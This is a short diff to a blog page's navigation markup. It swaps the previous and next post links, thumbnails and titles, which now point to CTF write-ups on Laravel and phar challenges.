@@ -407,15 +516,15 @@ $phar-&gt;stopBuffering();
           
             <div class="post-nepre half previous">
           
-            <a href="/2021/04/17/Laravel漏洞分析/" rel="prev">
+            <a href="/2021/04/17/护网杯-2018-easy-laravel/" rel="prev">
               <div class="background">
-                <img class="lazyload" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1140593.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1140593.jpg">
+                <img class="lazyload" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1141980.jpg" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1141980.jpg">
               </div>
               <span class="label">
               Previous Post</span>
               <div class="info">
                 <h3>
-                Laravel漏洞分析</h3>
+                [护网杯 2018]easy_laravel</h3>
                 <hr>
               </div>
             </a>
@@ -425,15 +534,15 @@ $phar-&gt;stopBuffering();
           
             <div class="post-nepre half next">
           
-            <a href="/2021/04/09/ThinkPHP X 源码分析/" rel="next">
+            <a href="/2021/04/09/NCTF2019-phar-matches-everything/" rel="next">
               <div class="background">
-                <img class="lazyload" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-719179.png" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-719179.png">
+                <img class="lazyload" src="/blogpictures/20160708223941_YQncj.jpeg" data-src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1141314.png" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-1141314.png">
               </div>
               <span class="label">
               Next Post</span>
               <div class="info">
                 <h3>
-                ThinkPHP X 源码分析</h3>
+                [NCTF2019]phar matches everything</h3>
                 <hr>
               </div>
             </a>
